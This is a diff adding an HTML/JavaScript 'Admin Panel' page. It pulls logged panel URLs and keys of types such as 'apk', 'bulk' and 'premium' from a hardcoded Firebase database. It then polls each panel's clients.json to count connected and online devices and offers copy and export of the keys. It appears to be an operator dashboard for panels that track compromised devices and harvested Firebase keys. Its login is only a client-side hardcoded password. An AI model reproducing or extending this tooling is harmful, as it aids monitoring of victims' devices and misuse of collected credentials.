@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Admin Panel · Any X Papa</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+:root{
+  --bg:#05050a;--panel:#0b0b14;--panel-2:#10101c;--panel-3:#141425;
+  --border:rgba(139,92,246,.14);--border-hi:rgba(160,140,255,.42);
+  --text:#e8e6f5;--muted:#7a7796;--muted-2:#55536d;
+  --violet:#8b5cf6;--cyan:#22d3ee;--green:#34d399;--red:#f43f5e;--amber:#fbbf24;--pink:#ec4899;
+  --ease:cubic-bezier(.22,1,.36,1);
+}
+html,body{background:var(--bg);min-height:100vh}
+body{font-family:'Space Grotesk',system-ui,-apple-system,sans-serif;color:var(--text);-webkit-font-smoothing:antialiased;overflow-x:hidden}
+.mono{font-family:'JetBrains Mono',monospace}
+button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit}
+input{font-family:inherit;-webkit-appearance:none;appearance:none}
+
+/* LOGIN */
+.login-wrap{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:radial-gradient(ellipse at center,#0a0714 0%,#04040a 65%,#000 100%);padding:20px;z-index:100}
+.login-card{width:100%;max-width:400px;background:var(--panel);border:1px solid var(--border);border-radius:20px;padding:28px 22px;box-shadow:0 8px 40px rgba(0,0,0,.6)}
+.login-icon{width:60px;height:60px;margin:0 auto 18px;border-radius:18px;background:linear-gradient(135deg,#8b5cf6,#22d3ee);display:flex;align-items:center;justify-content:center;box-shadow:0 0 30px rgba(139,92,246,.5)}
+.login-title{text-align:center;font-size:20px;font-weight:800;margin-bottom:6px;background:linear-gradient(120deg,#a78bfa,#22d3ee,#ec4899);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.login-sub{text-align:center;font-size:12px;color:var(--muted);margin-bottom:22px}
+.inp{width:100%;background:#06060f;border:1px solid var(--border);color:var(--text);border-radius:12px;padding:13px 15px;font-size:14px;outline:none;transition:border-color .18s,box-shadow .18s}
+.inp:focus{border-color:rgba(139,92,246,.55);box-shadow:0 0 0 3px rgba(139,92,246,.12)}
+.btn{width:100%;padding:13px 18px;border-radius:12px;font-weight:700;font-size:13px;letter-spacing:.02em;transition:filter .2s,transform .15s;margin-top:16px}
+.btn-primary{background:linear-gradient(135deg,#8b5cf6,#6366f1);color:#fff;border:1px solid rgba(167,139,250,.45)}
+.btn-primary:hover{filter:brightness(1.1)}
+.btn-primary:active{transform:scale(.98)}
+.err{color:#fb7185;font-size:12px;text-align:center;margin-top:12px;min-height:16px}
+
+/* DASHBOARD */
+.app{display:none}
+.app.active{display:block}
+header{position:sticky;top:0;z-index:40;background:rgba(4,4,10,.95);border-bottom:1px solid var(--border);backdrop-filter:blur(10px)}
+.head-inner{max-width:1400px;margin:0 auto;padding:12px 14px;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.logo{display:flex;align-items:center;gap:8px;flex-shrink:0}
+.logo-box{width:32px;height:32px;border-radius:10px;background:linear-gradient(135deg,#8b5cf6,#22d3ee);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.logo-text{font-weight:700;font-size:14px;background:linear-gradient(120deg,#a78bfa,#22d3ee);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;white-space:nowrap}
+.badge{display:inline-flex;align-items:center;gap:4px;padding:3px 9px;border-radius:999px;font-size:9px;font-weight:700;border:1px solid;letter-spacing:.05em;white-space:nowrap}
+.badge-admin{background:rgba(251,191,36,.12);border-color:rgba(251,191,36,.4);color:#fbbf24}
+.search-box{position:relative;flex:1;min-width:100%;order:3}
+.search-box svg{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--muted-2);pointer-events:none}
+.search-box input{width:100%;padding:11px 14px 11px 38px;background:#06060f;border:1px solid var(--border);border-radius:11px;color:var(--text);font-size:14px;outline:none}
+.search-box input:focus{border-color:rgba(139,92,246,.55)}
+.head-actions{margin-left:auto;display:flex;gap:6px;align-items:center;flex-wrap:wrap}
+.ibtn{display:inline-flex;align-items:center;justify-content:center;gap:5px;padding:9px 12px;border-radius:10px;border:1px solid var(--border);background:rgba(139,92,246,.06);color:var(--text);font-size:11px;font-weight:600;transition:background .2s,border-color .2s;white-space:nowrap}
+.ibtn:hover{background:rgba(139,92,246,.16);border-color:var(--border-hi)}
+.ibtn.danger{color:#fb7185;border-color:rgba(244,63,94,.3);background:rgba(244,63,94,.08)}
+.ibtn.danger:hover{background:rgba(244,63,94,.16)}
+.ibtn svg{flex-shrink:0}
+
+/* STATS */
+.stats-bar{border-bottom:1px solid var(--border);background:rgba(4,4,10,.6);overflow-x:auto;-webkit-overflow-scrolling:touch;scrollbar-width:none}
+.stats-bar::-webkit-scrollbar{display:none}
+.stats-inner{max-width:1400px;margin:0 auto;padding:14px;display:flex;gap:20px;flex-wrap:nowrap;min-width:max-content}
+.stat{display:flex;flex-direction:column;gap:3px;flex-shrink:0;min-width:70px}
+.stat-label{font-size:9px;text-transform:uppercase;letter-spacing:.15em;color:var(--muted-2);font-weight:700;white-space:nowrap}
+.stat-value{font-size:20px;font-weight:800;line-height:1;font-variant-numeric:tabular-nums;white-space:nowrap}
+.c-green{color:#34d399}.c-cyan{color:#67e8f9}.c-violet{color:#c4b5fd}.c-amber{color:#fbbf24}.c-pink{color:#f472b6}.c-muted{color:#7a7796}
+
+/* MAIN */
+main{max-width:1400px;margin:0 auto;padding:14px;width:100%}
+
+/* STORED DATA CARDS */
+.data-card{background:var(--panel);border:1px solid var(--border);border-radius:14px;padding:14px;margin-bottom:10px;transition:background .15s}
+.data-card:hover{background:var(--panel-2)}
+.dc-head{display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:10px}
+.dc-type{display:inline-flex;align-items:center;padding:3px 9px;border-radius:999px;font-size:9.5px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;border:1px solid}
+.type-firebase_added{background:rgba(52,211,153,.1);border-color:rgba(52,211,153,.35);color:#34d399}
+.type-apk{background:rgba(167,139,250,.1);border-color:rgba(167,139,250,.35);color:#c4b5fd}
+.type-bulk{background:rgba(34,211,238,.1);border-color:rgba(34,211,238,.35);color:#67e8f9}
+.type-premium{background:rgba(251,191,36,.1);border-color:rgba(251,191,36,.35);color:#fbbf24}
+.type-panel{background:rgba(236,72,153,.1);border-color:rgba(236,72,153,.35);color:#f472b6}
+.type-default{background:rgba(139,92,246,.1);border-color:rgba(139,92,246,.35);color:#c4b5fd}
+.dc-time{font-size:10px;color:var(--muted);white-space:nowrap}
+.dc-url{font-family:'JetBrains Mono',monospace;font-size:11px;color:#67e8f9;word-break:break-all;line-height:1.4;margin-bottom:8px;cursor:pointer;padding:8px 10px;background:rgba(5,5,10,.5);border-radius:8px;border:1px solid var(--border)}
+.dc-url:active{background:rgba(34,211,238,.08)}
+.dc-meta{display:flex;flex-wrap:wrap;gap:8px;font-size:10px;color:var(--muted)}
+.dc-meta span{display:inline-flex;align-items:center;gap:3px;background:rgba(139,92,246,.06);padding:3px 8px;border-radius:6px;border:1px solid var(--border)}
+.dc-key{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--muted-2);margin-top:6px;word-break:break-all;padding:6px 10px;background:rgba(5,5,10,.5);border-radius:8px;border:1px solid var(--border)}
+
+/* DEVICE CARDS */
+.dev-card{background:var(--panel);border:1px solid var(--border);border-radius:14px;padding:14px;margin-bottom:10px;border-left:3px solid rgba(139,92,246,.5);transition:transform .15s}
+.dev-card.online{border-left-color:#34d399;background:linear-gradient(135deg,rgba(52,211,153,.04),var(--panel))}
+.dev-card.offline{border-left-color:#7a7796}
+.dc-head-row{display:flex;align-items:flex-start;gap:10px;margin-bottom:10px}
+.dc-icon{width:38px;height:38px;border-radius:11px;flex-shrink:0;display:flex;align-items:center;justify-content:center;border:1px solid}
+.dc-icon.online{background:rgba(52,211,153,.13);border-color:rgba(52,211,153,.35);color:#34d399}
+.dc-icon.offline{background:rgba(20,18,40,.6);border-color:var(--border);color:var(--muted-2)}
+.dc-info{flex:1;min-width:0}
+.dc-name{font-size:14px;font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;margin-bottom:2px}
+.dc-id{font-family:'JetBrains Mono',monospace;font-size:9.5px;color:var(--muted-2);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.dc-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px}
+.dc-field{min-width:0}
+.dc-lbl{font-size:9px;text-transform:uppercase;letter-spacing:.12em;color:var(--muted-2);font-weight:700;margin-bottom:3px}
+.dc-val{font-size:12px;font-weight:600;color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.dc-val.mono{font-family:'JetBrains Mono',monospace;font-size:11px}
+.dc-val.green{color:#34d399}
+.dc-val.cyan{color:#a5f3fc}
+.dc-val.violet{color:#c4b5fd}
+.dc-val.amber{color:#fbbf24}
+.dc-val.pink{color:#f472b6}
+
+/* SECTION */
+.section-title{display:flex;align-items:center;gap:8px;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);margin:18px 0 10px;padding-left:4px}
+.section-title:first-child{margin-top:0}
+.section-count{background:rgba(139,92,246,.12);border:1px solid rgba(139,92,246,.3);color:#c4b5fd;padding:2px 8px;border-radius:999px;font-size:10px;font-weight:700}
+
+/* TABS */
+.tabs{display:flex;gap:6px;margin-bottom:14px;overflow-x:auto;padding-bottom:4px;scrollbar-width:none}
+.tabs::-webkit-scrollbar{display:none}
+.tab{padding:8px 14px;border-radius:10px;font-size:12px;font-weight:600;background:rgba(139,92,246,.06);border:1px solid var(--border);color:var(--muted);white-space:nowrap;flex-shrink:0;transition:all .15s}
+.tab.active{background:rgba(139,92,246,.18);border-color:rgba(139,92,246,.5);color:#ddd6fe}
+
+/* EMPTY/LOADING */
+.empty{text-align:center;padding:60px 20px;color:var(--muted)}
+.empty-icon{opacity:.35;margin-bottom:12px}
+.spin{width:16px;height:16px;border:2px solid rgba(139,92,246,.2);border-top-color:#a78bfa;border-radius:50%;animation:spin .7s linear infinite;display:inline-block;vertical-align:middle}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading{text-align:center;padding:50px 20px;color:var(--muted)}
+
+/* TOAST */
+.toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);padding:12px 20px;border-radius:12px;background:#14142a;border:1px solid var(--border-hi);font-size:13px;font-weight:600;z-index:200;animation:toastIn .3s var(--ease);max-width:90vw;text-align:center;word-break:break-word}
+@keyframes toastIn{from{opacity:0;transform:translate(-50%,16px)}to{opacity:1;transform:translate(-50%,0)}}
+
+/* MOBILE */
+@media(max-width:640px){
+  .head-inner{padding:10px 12px;gap:8px}
+  .logo-text{font-size:13px}
+  .ibtn{padding:8px 10px;font-size:10px}
+  .ibtn span{display:none}
+  .stats-inner{padding:12px;gap:16px}
+  .stat-value{font-size:18px}
+  main{padding:12px}
+  .dc-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:380px){
+  .stat{min-width:60px}
+  .stat-value{font-size:16px}
+}
+</style>
+</head>
+<body>
+
+<!-- LOGIN -->
+<div class="login-wrap" id="loginWrap">
+  <div class="login-card">
+    <div class="login-icon">
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="11" width="18" height="11" rx="2"/>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+      </svg>
+    </div>
+    <h1 class="login-title">Admin Panel</h1>
+    <p class="login-sub">Enter password to access</p>
+    <input type="password" id="pwInput" class="inp" placeholder="Password" autocomplete="off">
+    <button class="btn btn-primary" id="loginBtn">Unlock →</button>
+    <p class="err" id="errMsg"></p>
+  </div>
+</div>
+
+<!-- DASHBOARD -->
+<div class="app" id="appWrap">
+  <header>
+    <div class="head-inner">
+      <div class="logo">
+        <div class="logo-box">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z"/>
+          </svg>
+        </div>
+        <span class="logo-text">Admin Panel</span>
+        <span class="badge badge-admin">🔒</span>
+      </div>
+      <div class="head-actions">
+        <button class="ibtn" id="refreshBtn">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/>
+            <path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16"/><path d="M8 16H3v5"/>
+          </svg>
+          <span>Refresh</span>
+        </button>
+        <button class="ibtn" id="exportBtn">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 3v12"/><path d="m17 8-5-5-5 5"/><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+          </svg>
+          <span>Export</span>
+        </button>
+        <button class="ibtn danger" id="logoutBtn">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="m16 17 5-5-5-5"/><path d="M21 12H9"/><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/>
+          </svg>
+          <span>Logout</span>
+        </button>
+      </div>
+      <div class="search-box">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="11" cy="11" r="8"/><path d="m21 21-4.34-4.34"/>
+        </svg>
+        <input type="text" id="searchInput" placeholder="Search URL, key, source, device...">
+      </div>
+    </div>
+  </header>
+
+  <div class="stats-bar">
+    <div class="stats-inner">
+      <div class="stat"><span class="stat-label">Total</span><span class="stat-value c-violet" id="statTotal">0</span></div>
+      <div class="stat"><span class="stat-label">Today</span><span class="stat-value c-cyan" id="statToday">0</span></div>
+      <div class="stat"><span class="stat-label">Panels</span><span class="stat-value c-green" id="statPanels">0</span></div>
+      <div class="stat"><span class="stat-label">Devices</span><span class="stat-value c-amber" id="statDevices">0</span></div>
+      <div class="stat"><span class="stat-label">Online</span><span class="stat-value c-green" id="statOnline">0</span></div>
+      <div class="stat"><span class="stat-label">APK</span><span class="stat-value c-amber" id="statApk">0</span></div>
+      <div class="stat"><span class="stat-label">Bulk</span><span class="stat-value c-pink" id="statBulk">0</span></div>
+      <div class="stat"><span class="stat-label">Premium</span><span class="stat-value c-amber" id="statPremium">0</span></div>
+    </div>
+  </div>
+
+  <main>
+    <div class="tabs" id="tabsWrap">
+      <button class="tab active" data-tab="all">All</button>
+      <button class="tab" data-tab="panels">🔵 Panels</button>
+      <button class="tab" data-tab="devices">📱 Devices</button>
+      <button class="tab" data-tab="apk">📦 APK</button>
+      <button class="tab" data-tab="bulk">⚡ Bulk</button>
+      <button class="tab" data-tab="premium">👑 Premium</button>
+    </div>
+    <div id="contentWrap">
+      <div class="loading"><span class="spin"></span><p style="margin-top:10px;font-size:12px">Loading data…</p></div>
+    </div>
+  </main>
+</div>
+
+<script>
+/* ============================================================
+   CONFIG
+   ============================================================ */
+const ADMIN_PASSWORD  = "changeme123";                    // ← apna password
+const STORE_DB        = "https://fuckess-ca5b9-default-rtdb.firebaseio.com";
+const STORE_KEY       = "";                                // ← secret (agar private rules ho)
+const STORE_PATH      = "logs";
+const DEVICES_PATH    = "panel_devices";                   // ← agar devices bhi store ho rahe ho
+const AUTO_REFRESH_MS = 30000;
+
+/* ============================================================
+   LOGIC
+   ============================================================ */
+const $ = (id) => document.getElementById(id);
+let allData = [];
+let deviceStats = { total: 0, online: 0, panels: [] };
+let activeTab = "all";
+let refreshTimer = null;
+
+function checkLogin(){
+  const pw = $("pwInput").value;
+  if(pw === ADMIN_PASSWORD){
+    sessionStorage.setItem("admin_auth", "1");
+    showApp();
+  } else {
+    $("errMsg").textContent = "❌ Wrong password";
+    $("pwInput").value = "";
+  }
+}
+function showApp(){
+  $("loginWrap").style.display = "none";
+  $("appWrap").classList.add("active");
+  loadData();
+  if(refreshTimer) clearInterval(refreshTimer);
+  refreshTimer = setInterval(loadData, AUTO_REFRESH_MS);
+}
+function logout(){
+  sessionStorage.removeItem("admin_auth");
+  if(refreshTimer) clearInterval(refreshTimer);
+  location.reload();
+}
+
+async function loadData(){
+  try{
+    // Load logs
+    const authQ = STORE_KEY ? `auth=${STORE_KEY}&` : "";
+    const res = await fetch(`${STORE_DB}/${STORE_PATH}.json?${authQ}timestamp=${Date.now()}`);
+    if(!res.ok) throw new Error("HTTP " + res.status);
+    const raw = await res.json();
+    allData = raw && typeof raw === "object"
+      ? Object.entries(raw).map(([id, v]) => ({ id, ...v }))
+                     .sort((a,b) => (b.time||0) - (a.time||0))
+      : [];
+
+    // Load device stats — panels se devices count karo
+    await loadDeviceStats();
+
+    updateStats();
+    renderContent();
+  }catch(e){
+    $("contentWrap").innerHTML = `<div class="empty">
+      <div class="empty-icon">⚠️</div>
+      <p style="font-size:14px;font-weight:600;color:#fb7185">Failed to load</p>
+      <p style="font-size:12px;margin-top:6px">${e.message}</p>
+      <p style="font-size:11px;margin-top:12px;color:#55536d">Check STORE_DB in config</p>
+    </div>`;
+  }
+}
+
+async function loadDeviceStats(){
+  // Har panel ka device count check karo
+  const panelUrls = new Set();
+  allData.forEach(d => {
+    if((d.type === "firebase_added" || d.type === "panel" || d.type === "premium" || d.type === "bulk") && d.url){
+      panelUrls.add(d.url.replace(/\/$/,""));
+    }
+  });
+
+  const panels = [];
+  let totalDevices = 0;
+  let totalOnline = 0;
+
+  const arr = Array.from(panelUrls).slice(0, 30); // max 30 panels
+  await Promise.all(arr.map(async (url) => {
+    try{
+      const r = await fetch(`${url}/clients.json?${STORE_KEY?"auth="+STORE_KEY:""}&timestamp=${Date.now()}`);
+      if(!r.ok) return;
+      const raw = await r.json();
+      if(!raw || typeof raw !== "object") return;
+      const devs = Object.values(raw);
+      const online = devs.filter(d => d && d.status === true).length;
+      panels.push({ url, devices: devs.length, online });
+      totalDevices += devs.length;
+      totalOnline += online;
+    }catch{}
+  }));
+
+  deviceStats = { total: totalDevices, online: totalOnline, panels };
+}
+
+function updateStats(){
+  const now = new Date(); now.setHours(0,0,0,0);
+  const todayTs = now.getTime();
+  $("statTotal").textContent   = allData.length;
+  $("statToday").textContent   = allData.filter(d => (d.time||0) >= todayTs).length;
+  $("statPanels").textContent  = allData.filter(d => d.type === "firebase_added" || d.type === "panel").length;
+  $("statDevices").textContent = deviceStats.total;
+  $("statOnline").textContent  = deviceStats.online;
+  $("statApk").textContent     = allData.filter(d => d.type === "apk").length;
+  $("statBulk").textContent    = allData.filter(d => d.type === "bulk").length;
+  $("statPremium").textContent = allData.filter(d => d.type === "premium").length;
+}
+
+function typeClass(t){
+  const known = ["firebase_added","apk","bulk","premium","panel"];
+  return known.includes(t) ? "type-" + t : "type-default";
+}
+function fmtTime(ts){
+  if(!ts) return "—";
+  const d = new Date(ts);
+  const now = new Date();
+  const diff = now - d;
+  if(diff < 60000) return "just now";
+  if(diff < 3600000) return Math.floor(diff/60000) + "m ago";
+  if(diff < 86400000) return Math.floor(diff/3600000) + "h ago";
+  return d.toLocaleString("en-IN",{day:"2-digit",month:"short",hour:"2-digit",minute:"2-digit",hour12:true});
+}
+function esc(s){
+  return String(s??"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+}
+
+function getFilteredByTab(){
+  const q = ($("searchInput").value || "").trim().toLowerCase();
+  let arr = allData;
+  if(activeTab === "panels")  arr = allData.filter(d => d.type === "firebase_added" || d.type === "panel");
+  if(activeTab === "apk")     arr = allData.filter(d => d.type === "apk");
+  if(activeTab === "bulk")    arr = allData.filter(d => d.type === "bulk");
+  if(activeTab === "premium") arr = allData.filter(d => d.type === "premium");
+  if(q){
+    arr = arr.filter(d =>
+      String(d.url||"").toLowerCase().includes(q) ||
+      String(d.key||"").toLowerCase().includes(q) ||
+      String(d.source||"").toLowerCase().includes(q) ||
+      String(d.type||"").toLowerCase().includes(q) ||
+      String(d.file||"").toLowerCase().includes(q) ||
+      String(d.projectId||"").toLowerCase().includes(q)
+    );
+  }
+  return arr;
+}
+
+function renderContent(){
+  const wrap = $("contentWrap");
+  if(activeTab === "devices"){
+    renderDevices(wrap);
+    return;
+  }
+  const arr = getFilteredByTab();
+  if(!arr.length){
+    wrap.innerHTML = `<div class="empty">
+      <div class="empty-icon">
+        <svg width="52" height="52" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+          <rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18M9 21V9"/>
+        </svg>
+      </div>
+      <p style="font-size:14px;font-weight:600">No data ${allData.length ? "matches filter" : "yet"}</p>
+      <p style="font-size:12px;margin-top:6px">${allData.length ? "Try different keywords" : "Data will appear here automatically"}</p>
+    </div>`;
+    return;
+  }
+
+  wrap.innerHTML = arr.map(d => renderDataCard(d)).join("");
+}
+
+function renderDataCard(d){
+  const t = d.type || "unknown";
+  const meta = [];
+  if(d.devices != null) meta.push(`<span>📱 ${d.devices} devices</span>`);
+  if(d.file) meta.push(`<span>📦 ${esc(d.file)}</span>`);
+  if(d.projectId) meta.push(`<span>🆔 ${esc(d.projectId)}</span>`);
+  if(d.reason) meta.push(`<span style="color:#fb7185">⚠️ ${esc(d.reason)}</span>`);
+  if(d.source) meta.push(`<span>🔗 ${esc(d.source)}</span>`);
+
+  return `<div class="data-card">
+    <div class="dc-head">
+      <span class="dc-type ${typeClass(t)}">${esc(t)}</span>
+      <span class="dc-time">${esc(fmtTime(d.time))}</span>
+    </div>
+    ${d.url ? `<div class="dc-url" onclick="copyText('${esc(d.url)}')">${esc(d.url)}</div>` : ""}
+    ${d.key ? `<div class="dc-key" onclick="copyText('${esc(d.key)}')">🔑 ${esc(d.key)}</div>` : ""}
+    ${meta.length ? `<div class="dc-meta">${meta.join("")}</div>` : ""}
+  </div>`;
+}
+
+function renderDevices(wrap){
+  if(!deviceStats.panels.length){
+    wrap.innerHTML = `<div class="empty">
+      <div class="empty-icon">📱</div>
+      <p style="font-size:14px;font-weight:600">No devices found</p>
+      <p style="font-size:12px;margin-top:6px">Add some panels first</p>
+    </div>`;
+    return;
+  }
+  const q = ($("searchInput").value || "").trim().toLowerCase();
+  const filtered = q ? deviceStats.panels.filter(p => p.url.toLowerCase().includes(q)) : deviceStats.panels;
+
+  wrap.innerHTML = `
+    <div class="section-title">
+      📊 Summary
+      <span class="section-count">${deviceStats.total} total · ${deviceStats.online} online</span>
+    </div>
+    ${filtered.map(p => {
+      const pct = p.devices ? Math.round((p.online/p.devices)*100) : 0;
+      return `<div class="dev-card ${p.online > 0 ? 'online' : 'offline'}">
+        <div class="dc-head-row">
+          <div class="dc-icon ${p.online > 0 ? 'online' : 'offline'}">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 20h.01"/><path d="M2 8.82a15 15 0 0 1 20 0"/><path d="M5 12.859a10 10 0 0 1 14 0"/><path d="M8.5 16.429a5 5 0 0 1 7 0"/>
+            </svg>
+          </div>
+          <div class="dc-info">
+            <div class="dc-name">${esc(p.url.replace(/^https?:\/\//,"").replace(/\/$/,""))}</div>
+            <div class="dc-id">${p.online > 0 ? "🟢 LIVE" : "⚫ OFFLINE"}</div>
+          </div>
+        </div>
+        <div class="dc-grid">
+          <div class="dc-field"><div class="dc-lbl">Total Devices</div><div class="dc-val mono violet">${p.devices}</div></div>
+          <div class="dc-field"><div class="dc-lbl">Online</div><div class="dc-val mono green">${p.online}</div></div>
+          <div class="dc-field"><div class="dc-lbl">Offline</div><div class="dc-val mono">${p.devices - p.online}</div></div>
+          <div class="dc-field"><div class="dc-lbl">Online %</div><div class="dc-val mono cyan">${pct}%</div></div>
+        </div>
+      </div>`;
+    }).join("")}
+  `;
+}
+
+function copyText(t){
+  if(!t) return;
+  navigator.clipboard.writeText(t).then(()=>toast("✅ Copied")).catch(()=>toast("Copy failed"));
+}
+
+function exportJSON(){
+  if(!allData.length){ toast("⚠️ Nothing to export"); return; }
+  const exportData = { logs: allData, deviceStats, exportedAt: new Date().toISOString() };
+  const blob = new Blob([JSON.stringify(exportData, null, 2)], {type:"application/json"});
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = `admin-export-${Date.now()}.json`;
+  a.click();
+  URL.revokeObjectURL(a.href);
+  toast("📥 Exported " + allData.length + " records");
+}
+
+let toastTimer;
+function toast(msg){
+  const old = document.querySelector(".toast");
+  if(old) old.remove();
+  clearTimeout(toastTimer);
+  const el = document.createElement("div");
+  el.className = "toast";
+  el.textContent = msg;
+  document.body.appendChild(el);
+  toastTimer = setTimeout(()=>el.remove(), 2400);
+}
+
+/* EVENTS */
+$("loginBtn").addEventListener("click", checkLogin);
+$("pwInput").addEventListener("keydown", e => { if(e.key === "Enter") checkLogin(); });
+$("logoutBtn").addEventListener("click", logout);
+$("refreshBtn").addEventListener("click", () => { loadData(); toast("🔄 Refreshed"); });
+$("exportBtn").addEventListener("click", exportJSON);
+$("searchInput").addEventListener("input", renderContent);
+
+document.querySelectorAll(".tab").forEach(tab => {
+  tab.addEventListener("click", () => {
+    document.querySelectorAll(".tab").forEach(t => t.classList.remove("active"));
+    tab.classList.add("active");
+    activeTab = tab.dataset.tab;
+    renderContent();
+  });
+});
+
+if(sessionStorage.getItem("admin_auth") === "1"){
+  showApp();
+} else {
+  $("pwInput").focus();
+}
+</script>
+</body>
+</html>
